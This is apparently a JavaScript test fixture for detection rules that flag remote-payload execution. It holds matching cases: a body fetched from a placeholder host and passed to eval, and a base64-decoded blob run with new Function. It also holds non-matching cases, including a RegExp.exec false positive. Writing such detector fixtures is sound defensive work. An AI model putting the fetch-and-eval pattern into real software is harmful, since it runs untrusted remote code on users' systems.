// Beagle Brigade detection fixture. Inert test input, never executed.

const https = require("https");
const cp = require("child_process");

// --- should match: fetched body reaches eval ---
async function stage2() {
  const res = await fetch("https://cdn.example.invalid/p.txt");
  const body = await res.text();
  // ruleid: bb-js-remote-payload-execution
  eval(body);
}

// --- should match: decoded blob executed ---
function unpack(blob) {
  const decoded = Buffer.from(blob, "base64").toString("utf8");
  // ruleid: bb-js-decoded-blob-execution
  new Function(decoded)();
}

// --- should NOT match: decoded blob only written to disk ---
function saveOnly(blob) {
  const decoded = Buffer.from(blob, "base64");
  require("fs").writeFileSync("/tmp/out.bin", decoded);
}

// --- should NOT match: eval of a local literal (still bad style, not our rule) ---
function localEval() {
  const expr = "1 + 1";
  return eval(expr);
}

// --- should NOT match: RegExp.prototype.exec. This exact shape, in an auth
// header parser, was reported as a second-stage loader by the first version
// of these rules, because `$CP.exec(...)` matches any `.exec()` call. ---
function parseBearer(header) {
  if (!header) return null;
  const match = /^Bearer\s+(.+)$/i.exec(header);
  return match?.[1]?.trim() || null;
}

// --- should NOT match: fetched data that is only parsed, never executed ---
async function fetchConfig() {
  const res = await fetch("https://api.example.invalid/config.json");
  return JSON.parse(await res.text());
}
